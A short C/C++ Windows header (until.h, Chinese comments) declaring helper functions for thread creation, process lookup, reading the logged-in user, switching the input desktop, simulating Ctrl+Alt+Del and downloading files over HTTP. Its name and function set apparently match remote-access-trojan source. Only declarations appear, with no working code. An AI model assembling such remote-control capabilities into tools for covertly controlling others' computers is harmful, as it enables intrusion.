#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED
#include "RegEditEx.h"
typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
                       LPDWORD lpThreadId,
					   bool bInteractive = false);
	
DWORD GetProcessID(LPCTSTR lpProcessName);
char *GetLogUserXP();
char *GetLogUser2K();
char *GetCurrentLoginUser();

typedef struct{
	int number;        /*分割的字符串个数*/
	char** string;        /*字符串数组*/
}StringTab;

//StringTab StringSplit_Struct(const char * str,const char* split);
//bool UnloadModule(LPCTSTR lpModulePath);
//HANDLE FindModule(DWORD dwProcessID, LPCTSTR lpModulePath);
//bool UnloadRemoteModule(DWORD dwProcessID, HANDLE hModuleHandle);
//void d(char * msg);
BOOL SwitchInputDesktop();
//void splitname(const char *szfullfilename, char *szpathname, char *szfilename, char *szextname);
BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(char *name);
BOOL SimulateCtrlAltDel();
BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName);
#endif // !defined(AFX_UNTIL_H_INCLUDED)